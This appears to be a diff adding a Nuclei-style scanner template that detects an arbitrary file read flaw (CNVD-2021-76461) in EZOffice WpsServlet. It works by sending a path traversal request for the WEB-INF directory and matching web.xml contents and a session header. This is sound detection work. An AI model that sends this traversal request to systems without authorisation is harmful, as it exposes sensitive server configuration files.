@@ -1,0 +1,37 @@
+id: CNVD-2021-76461
+
+info:
+  name: EZOffice WpsServlet - Arbitrary File Read
+  author: iak3ec
+  severity: high
+  description: |
+    This template checks for arbitrary file read vulnerability in EZOffice WpsServlet.
+    It attempts to read the `WEB-INF` directory, which contains sensitive configuration files.
+    The vulnerability is identified by matching specific content in the response body and headers.
+  reference:
+    - https://www.whir.net/
+  tags: 万户网络-ezOFFICE
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/wpsservlet?option=loadFile&docId=web&dir=../WEB-INF&fileType=.xml"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "defaultroot"
+          - "DownloadCheckFilter"
+          - "web-app"
+        part: body
+        condition: and
+        
+      - type: regex
+        regex:
+          - "OASESSIONID="
+        part: header
